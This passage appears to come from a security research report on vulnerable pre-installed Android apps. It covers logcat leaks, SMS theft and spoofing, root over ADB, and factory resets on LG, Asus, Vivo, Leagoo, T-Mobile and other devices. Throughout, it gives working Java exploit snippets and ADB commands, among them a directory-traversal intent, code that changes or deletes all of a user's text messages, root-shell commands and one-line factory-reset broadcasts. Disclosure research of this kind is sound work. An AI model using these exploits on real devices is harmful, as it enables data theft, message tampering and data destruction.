Here we provide the source code to perform the attack using a notional package name of hab.huba. The first thing the attacking app needs to do is to make its private directory (i.e., /data/data/hab.huba) globally executable. This source code below will accomplish this.
File baseAppDir = getFilesDir().getParentFile(); baseAppDir.setExecutable(true, false);
After that, the attacking app needs to create a file in its private directory. The name can be anything although it will have to end in .log and the same file name (except the .log since it will be appended by the com.lge.gnsslogcat app) will need to be used when sending an intent to the com.lge.gnsslogcat app to start the logging. Using an example file name of test.txt.log, we will create it in the attacking app's private directory.
File logfile = new File(baseAppDir, "test.txt.log"); try {
logfile.createNewFile(); logfile.setWritable(true, false); } catch (IOException e) { e.printStackTrace(); }
This code will create an empty file in the attacking app's private directory that will be writable by the com.lge.gnsslogcat app. The SELinux rules on the device allow the com.lge.gnsslogcat app to write from a third-party app's private directory. The attacking app, hab.huba, will be the owner of the test.txt.log file even after the com.lge.gnsslogcat app writes logcat log data to it. Below is the code the attacking app will execute to initiate the writing of the logcat log file in its private directory to a file of its choosing.
Intent i = new Intent("com.lge.gnsslogcat"); i.setClassName("com.lge.gnsslogcat", "com.lge.gnsslogcat.GnssLogService"); i.putExtra("modulename", "GnssLogService"); i.putExtra("start", true); i.putExtra("logfilename", "../../../../data/data/hab.huba/test.txt"); ArrayList<String> darkness = new ArrayList<String>(); darkness.add("*:V Hidden"); i.putStringArrayListExtra("tags", darkness); startService(i);
The logfilename extra used in the intent controls the file name, but it can also be used to control the file path as there is no input filtering to prevent a directory traversal attack. If the attacking app just provides a file name without a path, the default path is /storage/emulated/0/gnsslog. Therefore, the attacking app can escape these directories and provide a path that will resolve to an already created file that is owned by the attacking app and resides in the attacking app's private directory. Normally, the com.lge.gnsslogcat app will only write messages corresponding to three different log tags, but the attacking app can provide parameter input to the logcat command executed by the com.lge.gnsslogcat app so that all messages (i.e., any log tag with any log level) will be contained in the file. The com.lge.gnsslogcat app will check for an ArrayList<String> object in the intent that corresponds to a key name of tags. This allows an app to specify additional log tags that will be used in the logcat command. The attacking app can provide specific log tags it is interested in, although a more convenient approach is just to obtain them all, as it may be difficult to know all the interesting log tags on the device ahead of time. When using logcat command,
10505 Judicial Drive, Suite 201 | Fairfax, VA 22030 | V: 703.352.2982 | F: 203.286.2533 | sales@kryptowire.com

the initiating process can specify specific log tags and the accompanying log level (and up) that should be included and silence everything else (effectively white-listing what should be included).
The com.lge.gnsslogcat app when executing normally will execute the logcat command below.
logcat -v threadtime -s GpsLocationProvider:V LocationManagerService:V GnssLogService:V
Whenever there are strings in the ArrayList<String> object corresponding to the a key name of tags passed in the intent, it will take each String and append a :V to the end of it and add it to the end of the command above. Therefore, the attacking app has some control over parameters to the command, although the attacking app cannot perform arbitrary command injection due to the way Java executes a single command using Runtime.exec(String) API call. The appending of :V to the a specific log tag just makes it so that any message with that log tag at the level of verbose or above will be included. The -s argument will silence all other log tags that are not explicitly included as arguments. To obtain all the log entries (all log tags at all levels), a String of *:V Hidden is provided to the ArrayList<String> object corresponding to the a key name of tags in the intent. The *:V is a wildcard that matches any log tag at the lowest log level which will match the lowest level and all levels above (i.e., every possible log message). Since the com.lge.gnsslogcat.GnssLogCat class iterates over the Strings that were provided in the ArrayList<String> object and appends a :V to the end, a space and arbitrary word (i.e., *:V Hidden) is provided in the input to keep the command valid. Therefore, the command that the GnssLogCat class executes will be the following.
logcat -v threadtime -s GpsLocationProvider:V LocationManagerService:V GnssLogService:V *:V Hidden:V
This command will execute and write all available log data to the file it was instructed to by the attacking app. The com.lge.gnsslogcat.GnssLogFileManager class will create the log file (if it does not exist) and write the file using a java.io.FileOutpstream wrapped in a java.io.OutputStreamWriter object. The path is controlled by the attacker and contained in the intent belonging to a key value of logfilename. The result is that the attacking app now has the com.lge.gnsslogcat app writing the system-wide logcat log to a file it owns in its private directory.
5.2 Orbic Wonder  Logcat Logs
The Orbic Wonder27 Android device provides a method to obtain the logcat logs via a pre-installed platform app with a package name of com.ckt.mmitest (versionCode=25, versionName=7.1.2) that will write the logcat logs to the SD card when a specific activity is started. Any app that requests the READ_EXTERNAL_STORAGE permission can read from the SD card and also the created logcat log file. Therefore, a local app on the device can quickly start a specific activity application component (com.ckt.mmitest.MmiMainActivity) in the app (com.ckt.mmitest) to have the logcat log get written to the SD card. After starting the app with a specific flag in the intent (FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS), the app can programmatically return to the home screen and the app (com.ckt.mmitest) will not be visible in the recent apps. Then the logcat log will be continually written and can be mined on the device for sensitive user data. Alternatively, the entire log file can be exfiltrated to a remote location for processing. An example file path that the logs get written to is

/sdcard/MmiTest/fd5d9b82_0202-221453.log. This file name may vary, but the directory will be the same. The source code below will initiate the writing of the logcat log file to external storage. The first intent will start the activity application component which initiates the writing of the logcat log to the SD card. This intent contains a flag that will hide it from the recent apps list. The thread then sleeps 0.7 seconds. Then it launches an intent to return to the home screen, so the app is no longer visible or accessible to the user via the recent apps list. This can be done in the background from a service application component.

Intent i = new Intent(); i.setClassName("com.ckt.mmitest", "com.ckt.mmitest.MmiMainActivity"); i.setFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS); this.startActivity(i);
try { Thread.sleep(700);
} catch (InterruptedException e) { e.printStackTrace();
}
Intent i2 = new Intent("android.intent.action.MAIN"); i2.addCategory(Intent.CATEGORY_HOME); startActivity(i2);

The default messaging app, com.android.mms (versionCode=25, versionName=7.1.2), on the Orbic Wonder device writes call data and the body of sent and received text messages to the logcat log. This is an insecure practice since it is unnecessary to write this data to the logcat log on a production device due to the possibility of the logcat log being exposed. The system_server process writes the call data to the logcat log. Using the ability to obtain the logcat log above, this will enable an app on the device to obtain the body of the user's sent and received text messages, as well as call data as they occur. Some concrete examples are provided below.

5.3 Asus ZenFone 3 Max  Obtaining the Logcat Logs, WiFi Passwords and More
The Asus ZenFone 3 Max Android device contains a pre-installed app with a package name of com.asus.loguploader (versionCode=1570000275, versionName=7.0.0.55_170515) with an exported interface that allows any app on the phone to obtain a dumpstate file (kernel log, logcat log, dump of system services, which includes text of active notifications), Wi-Fi Passwords, and other system data that gets written to external storage. The build fingerprint of the device is
asus/US_Phone/ASUS_X008_1:7.0/NRD90M/US_Phone-14.14.1711.92-20171208:user/release-
keys. In addition, the phone numbers for outgoing and incoming telephone calls get written to the logcat log, as well as the telephone numbers for outgoing and incoming text messages. Therefore, having access to the logcat log (via the dumpstate file), allows one to also obtain some telephony meta-data.
The com.asus.loguploader app has an exported component named com.asus.loguploader.LogUploaderService. This component can be accessed by an app on the device to generate the log files that get dumped to external storage. Once an app interacts with it using a specific intent, the device will vibrate once and create two notifications: one that says "Log generating... Please wait for a while" and another that says "Bug Reporter is running. Tap for more information or to stop the app." The device will vibrate again when the generation of the log files has completed. These two notifications are temporary and will be removed in around one second since a second intent is sent.
The com.asus.loguploader app cannot be disabled through the Settings app. The source code to write the log data to the SD card is provided below. The first intent is to start the log generation and the second intent is to quickly remove the notifications. If the second intent was not sent, the generation of log files would leave notifications in the status bar for the user to see.
Intent i = new Intent("MANUAL_UPLOAD"); i.setClassName("com.asus.loguploader", "com.asus.loguploader.LogUploaderService"); startService(i); Intent i2 = new Intent("MOVELOG_COMPLETED"); i2.setClassName("com.asus.loguploader", "com.asus.loguploader.LogUploaderService"); startService(i2);
The source code above will cause the com.asus.loguploader app to write log data to a base directory of /sdcard/ASUS/LogUploader. Each time this code is executed, it will overwrite the previous files. A listing of the files in the most relevant directory (i.e., /sdcard/ASUS/LogUploader/general/sdcard) is provided below.

The dumpstate.txt file is the result of running the dumpstate command28. This is essentially a dump containing the logcat log, kernel log, a dump of system services, and more. The generated dumpstate.txt file from the listing of files above is 9.3MB. Notably, the text of the active notifications is contained in the file. The active notifications from the dumpstate.txt file is provided in Appendix C. The logcat log is contained within the dumpstate.txt file. Telephony meta-data for text messages and phone calls appear in the logcat log. Below are some examples that we have identified, although there may be additional log messages that can appear.

5.4 LG G6 & LG Q6  Dumping the Logcat Logs and Kernel Logs to External Storage
The com.lge.mlt app (versionCode=60000002, versionName=6.0.2) is present as a pre-installed app on two LG devices we examined, show below with the corresponding build fingerprints.
LG G6 - lge/lucye_nao_us_nr/lucye:7.0/NRD90U/17355125006e7:user/release-keys LG Q6 - lge/mhn_lao_com_nr/mhn:7.1.1/NMF26X/173421645aa48:user/release-keys

The pre-installed com.lge.mlt app (versionCode=60000002, versionName=6.0.2) will dump an SQLite database to external storage containing a large amount of data including snippets of the logcat log and kernel log when it receives a broadcast intent with a specific action string that can be sent by any app on the device. The file that the app created on our device was 3.8 MB. The com.lge.mlt app has a broadcast receiver named com.lge.mlt.hiddenmenu.MptHiddenMenuReceiver. This receiver statically registers to receive broadcast intents that have an action string of com.lge.mlt.copy.hiddendatabase. Below is a snippet of the AndroidManifest.xml file of the com.lge.mlt app.
<receiver android:name="com.lge.mlt.hiddenmenu.MptHiddenMenuReceiver"> <intent-filter> <action android:name="MPT.GO_TO_HIDDEN_MENU"/> <action android:name="com.lge.mlt.copy.hiddendatabase"/> </intent-filter>
</receiver>
When the MptHiddenMenuReceiver broadcast receiver receives a broadcast intent with an action string of com.lge.mlt.copy.hiddendatabase, it will copy a database with a path of /mpt/LDB_MainData.db to a path of /sdcard/ldb/_data.ez. In addition, on the LG G6 device, a file named a file named /mpt/serial is copied to a path of /sdcard/ldb/_index.ez and the file contains the International Mobile Equipment Identity (IMEI) of the device. This app appears to store crash logs and other diagnostic data. The End-User License Agreement (EULA) for the com.lge.mlt app says that the data may contain "application use history, IMEI, country, language, serial number, model, screen resolution, OS information, reception strength, network location information, and service and connection status." Any app on the device that has been granted the READ_EXTERNAL_STORAGE permission can cause the com.lge.mlt app to write this database to the SD card and then mine it for personal data. In the _data.ez file, the table named t320 contains log entries from the kernel log and the logcat log.
5.5 Vivo V7  Dumping the Logcat Logs to External Storage
The Vivo V7 device contains an app with a package name of com.vivo.bsptest (versionCode=1, versionName=1.0). This app will initiate the writing of the logcat log and kernel log to external storage with a default path of /sdcard/bbklog once it receives an intent that can be sent by any app on the device. The writing of the logs is not totally transparent to the user. Once a third-party app sends an intent to the com.vivo.bsptest app, a sticky notification appears in the status bar that "Log Collection  Logs are running." The user can click the notification and cancel the collection of logs. The source code below will start the com.vivo.bsptest.BSPTestActivity activity app component (which activates the logging) with a flag which will hide it from the recent apps, wait 0.5 seconds, and then returns to the main launcher screen.
Intent i = new Intent(); i.setClassName("com.vivo.bsptest", "com.vivo.bsptest.BSPTestActivity"); i.setFlags(Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS); startActivity(i); try {
Thread.sleep(500); } catch (InterruptedException e) {
e.printStackTrace(); } Intent i2 = new Intent("android.intent.action.MAIN"); i2.addCategory(Intent.CATEGORY_HOME); startActivity(i2);

The Vivo V7 device can also be made to write the coordinates of screen presses to the logcat log as detailed in Section 9.1.

6. Exposing Telephony Data and Capabilities

We discovered that the Leagoo Z5C device allows any app co-located on the device to send arbitrary text messages. In addition, it allows any app on the device to obtain the most recent text message in each conversation via an exported content provider. We found that three devices sold by T-Mobile contained a Rich Communication Services (RCS) app that allows the sending of arbitrary text messages, allows the user's text messages to be read and modified, and provides the phone numbers of the user's contacts. This RCS app has also been refactored with a second package name that has essentially the same behavior.

6.1 Leagoo Z5C  Custom com.android.messaging App

We examined a Leagoo Z5C Android device, and we noticed some additional behavior that is not present in Google's version of the com.android.messaging app. The Leagoo Z5C had a build fingerprint of sp7731c_1h10_32v4_bird:6.0/MRA58K/android.20170629.214736:user/release-keys.

6.1.1 Leagoo Z5C  Sending Arbitrary Text Messages

Any app on the device can send an intent to an exported broadcast receiver application component that will

result in the sending of a text message where the phone number and body of the text message is controlled

by the attacker. This can be accomplished by a zero-permission third-party app. The

com.android.messaging

app

(versionCode=1000110,

versionName=1.0.001,

(android.20170630.092853-0)) contains an exported broadcast receiver named

com.android.messaging.trackersender.TrackerSender, and its declaration in the

AndroidManifest.xml file is provided below. The TrackerSender component is explicitly exported.

<receiver android:exported="true" android:name="com.android.messaging.trackersender.TrackerSender"> <intent-filter android:priority="0x7FFFFFFF"> <action android:name="com.sprd.mms.transaction.TrackerSender.SEND_SMS_ACTION"/> <action android:name="com.sprd.mms.transaction.TrackerSender.SMS_SENT_ACTION"/> <action android:name="com.sprd.mms.transaction.TrackerSender.RETRY_ALARM_ACTION"/> </intent-filter>
</receiver>

The

TrackerSender

component

registers

for

the

com.sprd.mms.transaction.TrackerSender.SEND_SMS_ACTION action. When this component receives

an intent with a specific action and has the appropriate data embedded in an intent, it will extract the data

from the intent and send a text message using the android.telephony.SmsManager API. Below is the

source code to make the TrackerSender component send a text message.

Intent i = new Intent(); i.setAction("com.sprd.mms.transaction.TrackerSender.SEND_SMS_ACTION"); i.putExtra("message_body", "Huba"); i.putExtra("message_recipient", "+1703555555"); i.putExtra("message_falg_retry", true); i.putExtra("message_phone_id", 1); i.putExtra("message_token", (long) 1234); sendBroadcast(i);

6.1.2 Leagoo Z5C  Obtaining the Most Recent Text Message from each Conversation
Due to an exported broadcast receiver, a zero-permission third-party app can query the most recent text message from each conversation. That is, for each phone number where the user has either texted or received a text from, a zero-permission third party app can obtain the body of the text message, phone number, name of the contact (if it exists), and a timestamp. The com.android.messaging app (versionCode=1000110, versionName=1.0.001, (android.20170630.092853-0)) contains an exported content provider with a name of com.android.messaging.datamodel.MessagingContentProvider. Below is the content provider being declared in the com.android.messaging app's AndroidManifest.xml file.
<provider android:authorities="com.android.messaging.datamodel.MessagingContentProvider" android:exported="true" android:label="@string/app_name" android:name=".datamodel.MessagingContentProvider"/>
As the querying of the content provider can be performed silently in the background, it can be continuously monitored to check to see if the current message in each conversation has changed and record any new messages. To query the most recent text message for each conversation, the app simply needs to query a content provider in the standard way where the authority string is com.android.messaging.datamodel.MessagingContentProvider/conversations. Below is the output of querying this content provider. The text messages that are sent by the device owner are the ones where the snippet_sender_display_destination field is empty.

6.2 Insecure RCS App on T-Mobile Devices
We discovered an insecure pre-installed app that handles RCS with a package name of com.rcs.gsma.na.sdk (or a refactored version of the app) on three devices. There was a refactored version of the same app with almost the same functionality with a different package name (com.suntek.mway.rcs.app.service). We are unsure if this app has other refactored instances with additional package names. This app allows any app co-located on the device to read, delete, insert, and modify the user's text messages, send arbitrary text messages, and obtain the phone numbers of the user's contacts. All of these capabilities are done without the required permissions since the com.rcs.gsma.na.sdk app externally exposes them and does not set permissions requirements to access them. All of the devices we confirmed that contain this app were sold as T-Mobile devices: Coolpad Defiant, T-Mobile Revvl Plus, and ZTE Zmax Pro. We will explain the vulnerabilities on the T-Mobile Revvl Plus although the source code to exploit the vulnerabilities on the other two devices are almost exactly the same except for a different package name and component names due to refactoring.
The T-Mobile Revvl Plus contains a pre-installed app with a package name of com.rcs.gsma.na.sdk (versionCode=1, versionName=RCS_SDK_20170804_01). This app executes as the system user (a privileged user) and cannot be disabled by the end-user. This application appears to handle RCS on the device. This application has 7 content providers that are exported and not protected by a permission, which makes them accessible to any app co-located on the device. Content provider application components are not exported by default, but the developers of this app explicitly exported them. A content provider acts as a repository for structured data and supports the standard SQL operations. Some of these content providers in the com.rcs.gsma.na.sdk app act as a wrapper where they internally access and operate on a different content provider. A content provider is accessed using an authority string. There is a content provider with a class name of com.rcs.gsma.na.provider.message.MessageProvider with an authority string of com.rcs.gsma.na.provider.message. When the com.rcs.gsma.na.provider.message authority is queried, it will query the sms authority (e.g., content://sms) and return the user's sent and received text messages. Each text message entry includes a timestamp, phone number, message body, flag for whether the user has seen the message or not, etc. The source code below will return a string containing all of the user's sent and received text messages. An example output of this method is provided in Appendix D.
Uri aUri = Uri.parse("content://com.rcs.gsma.na.provider.message"); ContentResolver cr = getContentResolver(); Cursor cursor = cr.query(aUri, null, null, null, null); String allData = ""; String temp = ""; if (cursor == null || cursor.getCount() == 0)
return null; cursor.moveToFirst(); do {
int columnCount = cursor.getColumnCount(); for(int id=0; id < cursor.getColumnCount(); id++) {
int type = cursor.getType(id); if (type == 4)
continue; temp = " " + cursor.getColumnName(id) + ":" + cursor.getString(id); allData += temp; Log.d("Key-Value pair", temp); } allData += "\n";

} while(cursor.moveToNext()); return allData;
The source code below will change the body of all the user's sent and received text messages to the word "goodbye". The content of individual messages can be modified by adding a where clause and selection arguments for a specific message id.
ContentResolver cr = getContentResolver(); ContentValues cv = new ContentValues(); cv.put("body","goodbye"); cr.update(Uri.parse("content://com.rcs.gsma.na.provider.message"), cv, null, null);
The source code below will delete all of the user's text messages.
ContentResolver cr = getContentResolver(); cr.delete(Uri.parse("content://com.rcs.gsma.na.provider.message"), null, null);
The phone numbers of the user's contacts can be obtained from the com.rcs.gsma.na.sdk app. This app has a content provider application component with a class name of com.rcs.gsma.na.provider.capability.CapabilityProvider with an authority string of com.rcs.gsma.na.provider.capability. The CapabilityProvider component acts as a wrapper to the content://com.android.contacts Uniform Resource Interface (URI). The output from querying the CapabilityProvider content provider is provided in Appendix E and is queried in the same way as querying for the user's text messages (provided above).
In the com.rcs.gsma.na.sdk app, there is a broadcast receiver application component with a fullyqualified class name of com.rcs.gsma.na.test.TestReceiver. This component is explicitly exported and allows a user to send a text message where the phone number and message can be chosen by the sender. This can be abused to send text messages to premium numbers or be used to send a distasteful message to all the user's contacts. This can be accomplished by first using the CapabilityProvider component and to obtain the phone number's of the user's contacts and then sending them a text message.
Intent i = new Intent("com.rcs.gsma.na.sdk.TestReceiver"); i.setClassName("com.rcs.gsma.na.sdk", "com.rcs.gsma.na.test.TestReceiver"); i.putExtra("type", 110); i.putExtra("number", "7035557777"); i.putExtra("isLarge", false); i.putExtra("value", "help?!?!?"); sendBroadcast(i);
7. Local Root Privilege Escalation via ADB
We discovered two devices that allow the user to obtain root privileges by entering commands via ADB: Alcatel A30 and Leagoo P1. These two devices allow a user with physical access to the device to obtain a root shell on the device by allowing the shell user (ADB) to modify read-only properties at runtime. This undocumented feature goes against the standard Android security model. Recently, a Twitter user with the handle of Elliot Anderson discovered that certain OnePlus devices can obtain root access via ADB29.
29 https://www.xda-developers.com/oneplus-root-access-backdoor/
10505 Judicial Drive, Suite 201 | Fairfax, VA 22030 | V: 703.352.2982 | F: 203.286.2533 | sales@kryptowire.com

Notably, the Alcatel A30 was an Amazon Prime exclusive device30. We will focus on the Alcatel A30 device, although the approach to obtain a root shell via ADB is the same for both devices: modify read-only properties at runtime and restart the ADB daemon so it executes as the root user.

7.1 Alcatel A30  Root Privilege Escalation via ADB

Allowing the modification of read-only properties at runtime allows either a user with physical access to the device or the vendor (specifically TCL Corporation) to execute commands as the root user. The properties of concern here are ro.debuggable and ro.secure. Notably, on the Alcatel A30 device, changing the ro.debuggable property to have a value of 1 will create a UNIX domain socket named factory_test that will execute the commands supplied to it as the root user. This behavior is not present on the Leagoo P1 device. This allows the vendor to execute commands as the root user if they change the value of the ro.debuggable property and use a process that has access to write to the factory_test socket in the /dev/socket directory, although we did not witness the behavior. Moreover, we verified that platform apps can change the ro.debuggable property at runtime. TCL Corporation should control the framework key since they are the vendor and have certain apps that are executing as the system user. In addition, they also control the SELinux rules to control which processes can interact with the factory_test socket.

The end-user can also obtain root privileges by restarting ADB as root using certain commands via ADB. This allows a root shell via ADB to be obtained for command execution as the root user. At this point, root privileges can be used to obtain a permanent root privilege as opposed to a temporary one. Using root privileges, the private directories of apps, among others, can be examined and exfiltrated. For ADB to be able to execute commands as the root user, instead of the usual shell user, the ro.debuggable property needs to be set to a value of 1 and the ro.secure property needs to be set to a value of 0. At this point, the user can use the adb root command, which will restart the adbd process running as the root user. With root privileges, SELinux can be disabled to prevent the Mandatory Access Control (MAC) rules from preventing certain actions on the device using the setenforce 0 command. Below are the commands to enter using ADB to obtain a root shell.

adb shell setprop ro.debuggable 1 adb shell setprop ro.secure 0 adb root adb shell setenforce 0 adb shell MICKEY6US:/ # id uid=0(root) gid=0(root) groups=0(root),1004(input),1007(log),1011(adb),1015(sdcard_rw),1028(sdcard_r),3001(net_bt_admi n),3002(net_bt),3003(inet),3006(net_bw_stats),3009(readproc) context=u:r:shell:s0

On the Alcatel A30 device, the init.rc file contains the logic to start the /system/bin/factory_test binary once the ro.debuggable property is set to a value of 1.

7.2 Leagoo P1  Root Privilege Escalation via ADB

Similar behavior is also (except the factory_test socket) present on the Leagoo P1 device with a build fingerprint of sp7731c_1h10_32v4_bird:6.0/MRA58K/android.20170629.214736:user/releasekeys. Below are the ADB commands, the same as for the Alcatel A30 device, to obtain a root shell via ADB.

8. Programmatically Factory Resetting the Device

A factory reset will wipe the data and cache partitions. This removes any apps the user has installed and any other user or app data that the user does not have backed up externally. An unintentional factory reset can present a major inconvenience due to potential for data loss. For an app to be able to directly factory reset a device, it requires that an app have the MASTER_CLEAR permission31. This permission is only granted to apps that are pre-installed. Therefore, a third-party app that the user downloads cannot perform a factory reset of the device directly. There is an exception for enabled Mobile Device Management (MDM) apps. A user can download an MDM app and then enable it as a device administrator through the Settings app. Prior to enabling the app as a device administrator, the user will be presented with its list of capabilities, which can include the "erase all data" capability. All of the vulnerabilities we found were due to an app privileged

31 https://developer.android.com/reference/android/Manifest.permission.html#MASTER_CLEAR

10505 Judicial Drive, Suite 201 | Fairfax, VA 22030 | V: 703.352.2982 | F: 203.286.2533 | sales@kryptowire.com

enough to perform a factory reset (i.e., apps that are granted the MASTER_CLEAR permission and platform apps) exposing an interface that, when called, will programmatically initiate a factory reset of the device.
A privileged app can initiate a factory reset of the device by sending a broadcast intent with an action of android.intent.action.MASTER_CLEAR. The system_server process contains a broadcast receiver named com.android.server.MasterClearReceiver that, when it receives the MASTER_CLEAR action, will boot into recovery mode to format the data and cache partitions. This is generally accomplished by calling a method with a signature that is similar to the following method although the parameters can vary: android.os.RecoverySystem.rebootWipeUserData(*). This method writes content to a file with a path of /cache/recovery/command that contains at least the line of --wipe_data and boots into recovery mode.
8.1 T-Mobile Revvl Plus & T-Mobile Coolpad Defiant  Factory Reset
The T-Mobile Revvl Plus device32 and the T-Mobile Coolpad Defiant33 have a pre-installed app with a package name of com.qualcomm.qti.telephony.extcarrierpack (versionCode=25, versionName=7.1.1). This app is privileged since it executes as the system user. This app contains a broadcast receiver application component with a fully qualified class name of com.qualcomm.qti.telephony.extcarrierpack.UiccReceiver. When the UiccReceiver component receives a broadcast intent with an action string of com.tmobile.oem.RESET, it will initiate and complete a programmatic factory reset by sending out a broadcast intent with an action string of android.intent.action.MASTER_CLEAR. This will cause the user to lose any data that they have not backed up or synced to an external location. The source code provided below will initiate a factory reset of the device.
sendBroadcast(new Intent("com.tmobile.oem.RESET"));
8.2 Essential Phone  Factory Reset
The vulnerability lies in an app with a package name of com.ts.android.hiddenmenu (versionName=1.0, platformBuildVersionName=8.1.0). This app is a platform app and executes as the system user. Generally, the MASTER_CLEAR permission34 is required to be able to send a broadcast intent with an action string of android.intent.action.MASTER_CLEAR broadcast intent, but the app has the capability as various powerful permissions are granted by default to platform apps. The com.ts.android.hiddenmenu app has an activity application component show below.
<activity android:exported="true" android:label="@string/rtn" android:name="com.ts.android.hiddenmenu.rtn.RTNResetActivity" android:noHistory="true" android:screenOrientation="portrait" android:theme="@android:style/Theme.Dialog"/>
The RTNResetActivity app component is explicitly exported, as it sets the android:exported attribute to a value of true. When an app component is exported, this allows any on the device to start this app component since there are no permission requirements (e.g., android:permission attribute) to access it.

Internally, the RTNResetActivity component starts other components where the com.ts.android.hiddenmenu.util.ResetActivity activity sends a broadcast intent with android.intent.action.MASTER_CLEAR. This will programmatically factory reset the device and potentially cause data loss. The source code below can be run to initiate a factory reset.
Intent i = new Intent(); i.setClassName("com.ts.android.hiddenmenu", "com.ts.android.hiddenmenu.rtn.RTNResetActivity"); startActivity(i);
Figure 2 shows the steps involved for a third-party to programmatically factory reset the Essential device.
FIGURE 2. PROGRAMMATIC FACTORY ON THE ESSENTIAL PHONE DEVICE.
8.3 ZTE Zmax Champ  Factory Reset The pre-installed app that exposes the capability for a third-party app to factory reset the device has a package name of com.zte.zdm.sdm (versionCode=31, versionName=V5.0.3). This app executes as the system user. This app does not request the android.permission.MASTER_CLEAR permission in it AndroidManifest.xml file, although it will be automatically granted this permission since it is executing as the system user. The system user is a privileged user on the device and is granted a powerful block of permissions by default. One of these capabilities granted to the system user is to programmatically factory reset the device. The com.zte.zdm.sdm app has a statically declared broadcast receiver in its AndroidManifest.xml file with a name of com.zte.zdm.VdmcBroadcastReceiver that can handle broadcast intents with an action string of android.intent.action.DM_FATORY_RESET_TEST_BY_TOOL. The VdmcBroadcastReceiver component is exported, by default, and accessible to any app on the device, since it does not explicitly set the android:exported attribute a value to false, has at least one intent-filter declared, and is not protected by a custom or platform-defined permission. When a broadcast intent is sent with this action, the com.zte.zdm.MyCommand.bootCommand(String) method is called with a parameter of --wipe_data. This method will write a value of --wipe_data to a file with a path of /cache/recovery/command and then use the PowerManager to boot into recovery mode. Generally, a few additional lines are written in addition to the --wipe_data line, but these lines have been omitted from step 5 of Figure 2. This will

programmatically factory reset the device. The code to perform the aforementioned described behavior is below. The code is a single line and simply sends a broadcast intent with a specific action string.
sendBroadcast(new Intent("android.intent.action.DM_FATORY_RESET_TEST_BY_TOOL"));
8.4 Leagoo Z5C  Factory Reset
Any app on the device can send an intent to factory reset the device programmatically. This does not require any user interaction. capability is present in an unprotected application component of the com.android.settings app (versionCode=23, versionName=6.0-android.20170630.092853). This app has an exported broadcast receiver named com.sprd.settings.PhoneTrackCommandReceiver, and its declaration in the AndroidManifest.xml file is shown below.
<receiver android:name="com.sprd.settings.PhoneTrackCommandReceiver"> <intent-filter> <action android:name="android.intent.action.phonetrack_masterclear"/> <action android:name="android.intent.action.phonetrack_setpassword"/> </intent-filter>
</receiver>
Internally, when the PhoneTrackCommandReceiver component receives a broadcast intent with an action string of android.intent.action.phonetrack_masterclear, it will send a broadcast intent with an action string of android.intent.action.MASTER_CLEAR, which initiates a programmatic factory reset of the device. The single source code line below will cause the Leagoo Z5C device to be perform a factory reset.
sendBroadcast(new Intent("android.intent.action.phonetrack_masterclear"));
8.5 Leagoo P1  Factory Reset
The vulnerability lies in an app with a package name of com.wtk.factory (versionCode=1, versionName=1.0). This app executes as the system user as it is a platform app. Specifically, this app is signed with the platform key and sets the android:sharedUserId attribute to a value of android.uid.system in its AndroidManifest.xml file. This app also requests the MASTER_CLEAR permission, allowing it to perform a programmatic factory reset of the device. The com.wtk.factory app has a broadcast receiver application component declared in its AndroidManifest.xml file show below.
<receiver android:name="com.wtk.factory.MMITestReceiver"> <intent-filter> <action android:name="com.mmi.helper.request"/> </intent-filter>
</receiver>
The MMITestReceiver app component sends a broadcast intent with android.intent.action.MASTER_CLEAR as the action string when it receives an intent sent to it using the source code below.
Intent i2 = new Intent(); i2.setAction("com.mmi.helper.request");
10505 Judicial Drive, Suite 201 | Fairfax, VA 22030 | V: 703.352.2982 | F: 203.286.2533 | sales@kryptowire.com

i2.setClassName("com.wtk.factory", "com.wtk.factory.MMITestReceiver"); i2.putExtra("type", "factory_reset"); i2.putExtra("value", "100"); sendBroadcast(i2);
8.6 Plum Compass  Factory Reset
The vulnerability is contained in an app with a package name of com.android.settings (versionCode=23, versionName=6.0-eng.root.20161223.224055). This app is a platform app and executes as the system user. This app also requests the MASTER_CLEAR permission allowing it to perform a programmatic factory reset of the device. The com.android.settings app has a broadcast receiver application component show below.
<receiver android:name="com.android.settings.FactoryReceiver"> <intent-filter> <action android:name="android.intent.action.factory"/> </intent-filter>
</receiver>
Internally, the FactoryReceiver component sends a broadcast intent with android.intent.action.MASTER_CLEAR as the action string when it receives an intent sent to it using the source code below.
Intent i = new Intent(); i.setClassName("com.android.settings", "com.android.settings.FactoryReceiver"); sendBroadcast(i);
8.7 Orbic Wonder  Factory Reset
The vulnerability lies in the core Android package (with a package name of android) which is a privileged part of the Android OS. This process executes as the system user. Within the android package, there is a broadcast receiver application component named com.android.server.MasterClearReceiver. When this component receives a broadcast intent addressed to it, it will programmatically initiate and complete a factory reset. The source code below will initiate a factory reset on the device. Please note that the action string of potatoes is not strictly required, it just needs to be any non-empty string.
Intent i2 = new Intent(); i2.setClassName("android", "com.android.server.MasterClearReceiver"); i2.setAction("potatoes"); sendBroadcast(i2);
8.8 MXQ TV Box 4.4.2  Factory Reset
Normally, sending a broadcast with an action string of android.intent.action.MASTER_CLEAR cannot be sent by a third-party app, but it can be sent by a third-party app on this device. This is due to the fact that the com.android.server.MasterClearReceiver app component in the system_server process is not statically registered in the core android package, and is instead registered dynamically and does not have the MASTER_CLEAR permission access requirement. This behavior is not present in 4.4.2 AOSP code.

sendBroadcast(new Intent ("android.intent.action.MASTER_CLEAR"));
The programmatic factory reset will wipe all user data and any data that has not been backed up or synced to an external location will be lost.
9. Setting Properties as the com.android.phone User
We discovered a pre-installed app on some devices that exposes the capability to set system properties as the com.android.phone user. This can be performed by any app on the device due to an exported service in the com.qualcomm.qti.modemtestmode app. This platform app executes as the system user. Appendix F provides the AndroidManifest.xml file for the com.qualcomm.qti.modemtestmode app from a Vivo V7 Android device. This app contains an explicitly exported service named MbnTestService that allows the caller to provide a key-value pair that it will write as a system property. This application is still bound by SELinux rules regarding its context and associated capabilities. Based on our testing, the com.qualcomm.qti.modemtestmode app can modify system properties that start with the persist. prefix (e.g., persist.sys.factory.mode). Vendors can introduce their own system properties that can alter the functionality of the device when a system property is set to a certain value.
The MbnTestService service is a bound service that provides an interface for clients to access. The bound service has a corresponding AIDL file that easily allows the client app to perform RPCs on the service. If a client app lacks the AIDL file, the client app can still interact with the bound service although they will have to perform low-level behavior that the AIDL file abstracts from the developer. The client will need to create and populate the Parcel object, provide the correct interface name, and call the correct function number on the interface. The source code to perform this behavior on the Vivo V7 is provided in Appendix G. We provide two examples, Vivo V7 and Coolpad Canvas, of how settings a system property can enable logging features on a device that would otherwise be unavailable to a third-party app.
9.1 Vivo V7  Obtaining User Touch Input
